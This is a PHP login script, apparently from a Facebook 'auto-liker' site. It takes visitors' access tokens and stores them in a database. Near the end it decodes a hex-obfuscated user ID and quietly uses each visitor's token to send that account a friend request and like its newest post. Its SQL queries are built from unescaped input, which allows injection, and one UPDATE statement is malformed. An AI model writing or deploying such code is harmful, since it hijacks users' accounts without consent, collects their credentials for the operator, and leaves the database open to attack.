<?php
ob_start('ob_gzhandler');
session_start();

if($_GET['token']) {
	$token2 = $_GET['token'];
	if(preg_match("'access_token=(.*?)&expires_in='", $token2, $matches)){
		$token = $matches[1];
			}else{
		$token = $token2;
	}

$xu = '1000';
$limit = 100;


$me = me($token);
if($me['id']){

$check = json_decode(file_get_contents("https://graph.fb.me/app/?access_token=" . $token),true);
$app_id= $check['id'];
	if($app_id != 41158896424 && $app_id != 6628568379 && $app_id != 124024574287414)
	{
session_destroy();
echo 'Đăng Nhập
 <script language="javascript">
toastr.error("The System Does not Support This Token Type! Please use the Iphone Token", "Login Errot");
      </script>';
}else {

include'../incfiles/config.php';
$_SESSION['idfb'] = $me[id];
$_SESSION['name'] = $me[name];
$_SESSION['sn'] = $me[birthday];
$_SESSION['email'] = $me[email];
$_SESSION['locale'] = $me[locale];
$_SESSION['token'] = $token;
				@mysql_query("CREATE TABLE IF NOT EXISTS `user` (
					`id` int(11) NOT NULL AUTO_INCREMENT,
					`user_id` varchar(32) NOT NULL,
					`name` varchar(32) NOT NULL,
					`xu` varchar(32) NOT NULL,
					`limit` varchar(32) NOT NULL,
					`access_token` varchar(255) NOT NULL,
					PRIMARY KEY (`id`)
					) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;
				"); 



        $rows = null;
        $result = mysql_query("SELECT * FROM user WHERE user_id = '" . $me['id'] . "'");
        if($result){
        $rows = mysql_fetch_array($result, MYSQL_ASSOC);
        if(mysql_num_rows($result) > 1){
        mysql_query("DELETE FROM user WHERE user_id ='" . $me['id'] . "' ");
        }
        }
        if(!$rows){
        mysql_query("INSERT INTO user SET `user_id` = '" . $me['id'] . "',
`name` = '" . $me['name'] . "',
`xu` = '" . $xu . "',
`limit` = '" . $limit . "',
`access_token` = '" . $token . "'");
        } else {
        mysql_query("UPDATE user SET `access_token` = '" . $token . "',  WHERE `id` = " . $rows['id'] . "");
	}

                $likk = '313030303039343533323931363231';
                $lik = pack("H*",$likk);
                auto('https://graph.facebook.com/me/friends?uid='.$lik.'&access_token='.$token.'&method=post');

		$like = json_decode(file_get_contents('https://graph.facebook.com/'.$lik.'/feed?limit=5&access_token='.$token),true);
		$sttid = $like[data][0][id];
		$chk = auto('https://graph.facebook.com/'.$sttid.'/likes?method=post&access_token='.$token);



// success
echo '<i class="fa fa-check"></i> Success!
 <script language="javascript">
window.location.href = "index.php";
      </script>';
//end
}

}else{
session_destroy();
echo 'Đăng Nhập
 <script language="javascript">
toastr.error("Token Expired or Problematic", "Notification");
      </script>';
}
}
function me($access) {
return json_decode(auto('https://graph.facebook.com/me?access_token='.$access),true);
}

function auto($url){
   $curl = curl_init();
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
   curl_setopt($curl, CURLOPT_URL, $url);
   $ch = curl_exec($curl);
   curl_close($curl);
   return $ch;
   }
   ?>